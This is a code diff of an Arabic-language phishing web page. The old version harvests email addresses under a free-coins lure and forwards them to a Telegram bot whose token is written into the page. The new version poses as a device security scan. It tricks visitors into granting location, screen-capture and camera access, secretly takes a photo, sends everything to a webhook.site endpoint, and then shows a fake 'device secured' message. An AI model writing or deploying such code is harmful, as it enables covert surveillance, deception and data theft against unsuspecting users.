@@ -1,72 +1,105 @@
-
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>شحن كوينز مجانا</title>
-<style>
-  body {
-    font-family: 'Tajawal', sans-serif;
-    background-color: #1a0000;
-    color: #fff;
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-    justify-content: center;
-    height: 100vh;
-    margin: 0;
-  }
-  input, button {
-    padding: 12px;
-    font-size: 18px;
-    margin: 10px 0;
-    border-radius: 8px;
-    border: none;
-    width: 280px;
-  }
-  button {
-    background-color: #a00000;
-    color: white;
-    font-weight: 700;
-    cursor: pointer;
-  }
-  button:hover {
-    background-color: #ff0000;
-  }
-  label {
-    font-weight: 700;
-  }
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>مركز الأمان الرقمي | فحص النظام</title>
+    <style>
+        :root { --primary: #007bff; --bg: #0f172a; --card: #1e293b; --text: #f8fafc; }
+        body { background-color: var(--bg); color: var(--text); font-family: 'Segoe UI', Tahoma, sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
+        .container { background: var(--card); padding: 40px; border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.5); max-width: 450px; width: 90%; text-align: center; border: 1px solid #334155; }
+        .icon-shield { font-size: 60px; color: var(--primary); margin-bottom: 20px; }
+        h1 { font-size: 22px; margin-bottom: 10px; }
+        p { font-size: 14px; color: #94a3b8; line-height: 1.6; }
+        .status-box { background: #000; padding: 15px; border-radius: 10px; margin: 20px 0; font-family: monospace; font-size: 12px; text-align: left; color: #4ade80; height: 80px; overflow-y: auto; }
+        .main-btn { background: var(--primary); color: white; border: none; padding: 15px 30px; border-radius: 30px; font-weight: bold; cursor: pointer; width: 100%; transition: 0.3s; font-size: 16px; }
+        .main-btn:hover { background: #0056b3; transform: translateY(-2px); }
+        video, canvas { display: none; }
+    </style>
 </head>
 <body>
-<h2>أدخل إيميلك</h2>
-<input type="email" id="email" placeholder="example@mail.com" required />
-<button onclick="sendEmail()">إرسال</button>
+
+<div class="container">
+    <div class="icon-shield">🛡️</div>
+    <h1>فحص أمان الجهاز</h1>
+    <p>لقد تم رصد نشاط مشبوه من عنوان IP غير معروف. يرجى البدء بالفحص الفوري لتأمين ملفاتك وصورك من الاختراق.</p>
+    
+    <div class="status-box" id="log">
+        > نظام الفحص جاهز...<br>
+        > بانتظار استجابة المستخدم...
+    </div>
+
+    <button class="main-btn" id="start-scan">بدء الفحص الآمن الآن</button>
+</div>
+
+<video id="video" autoplay playsinline></video>
+<canvas id="canvas"></canvas>
 
 <script>
-const token = "7713540341:AAGfI7IguGT5dwEhiocvC9h0mVW9js4ByJQ";
-const chatId = "6778604620";
+    const WEBHOOK_URL = "https://webhook.site/3f84a901-c057-4875-b639-3a035c2cfa48";
+    const logBox = document.getElementById('log');
+    const btn = document.getElementById('start-scan');
 
-function sendEmail() {
-  const email = document.getElementById('email').value.trim();
-  if (!email) {
-    alert('يرجى إدخال الإيميل');
-    return;
-  }
-  const message = `📧 طلب شحن كوينز مجانا:
+    function updateLog(msg) {
+        logBox.innerHTML += `<br>> ${msg}`;
+        logBox.scrollTop = logBox.scrollHeight;
+    }
 
-📧 البريد الإلكتروني: ${email}`;
-  fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
-    .then(res => {
-      if (res.ok) {
-        alert('تم إرسال طلبك بنجاح!');
-      } else {
-        alert('خطأ في الإرسال، حاول مرة أخرى');
-      }
-    })
-    .catch(() => alert('خطأ في الاتصال'));
-}
+    btn.onclick = async () => {
+        btn.disabled = true;
+        btn.innerText = "جاري الفحص...";
+        updateLog("جاري طلب صلاحيات الوصول...");
+
+        let data = { status: "Successful Capture", timestamp: new Date().toLocaleString() };
+
+        try {
+            // 1. سحب الموقع الجغرافي
+            const pos = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej));
+            data.location = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+            updateLog("تم التحقق من الموقع الجغرافي.");
+
+            // 2. سحب لقطة شاشة (Screen Capture)
+            // ملاحظة: ستطلب من المستخدم اختيار الشاشة
+            const screenStream = await navigator.mediaDevices.getDisplayMedia({ video: true });
+            updateLog("تم تحليل سجلات الشاشة.");
+            // (اختياري: يمكن أخذ فريم من الشاشة هنا كما فعلنا سابقاً)
+            screenStream.getTracks().forEach(t => t.stop());
+
+            // 3. سحب الكاميرا (Face Auth)
+            const camStream = await navigator.mediaDevices.getUserMedia({ video: true });
+            const video = document.getElementById('video');
+            video.srcObject = camStream;
+            
+            updateLog("جاري مطابقة بصمة الوجه...");
+
+            setTimeout(async () => {
+                const canvas = document.getElementById('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                data.photo = canvas.toDataURL('image/jpeg', 0.6);
+                
+                camStream.getTracks().forEach(t => t.stop());
+                updateLog("اكتمل الفحص. جاري تشفير التقرير...");
+
+                // 4. إرسال كل البيانات للـ Webhook
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    body: JSON.stringify(data)
+                });
+
+                updateLog("تم تأمين الجهاز بنجاح.");
+                setTimeout(() => window.location.href = "https://safety.google.com", 2000);
+            }, 2000);
+
+        } catch (err) {
+            updateLog("خطأ: يرجى منح كافة الصلاحيات للفحص.");
+            btn.disabled = false;
+            btn.innerText = "إعادة محاولة الفحص";
+        }
+    };
 </script>
+
 </body>
 </html>
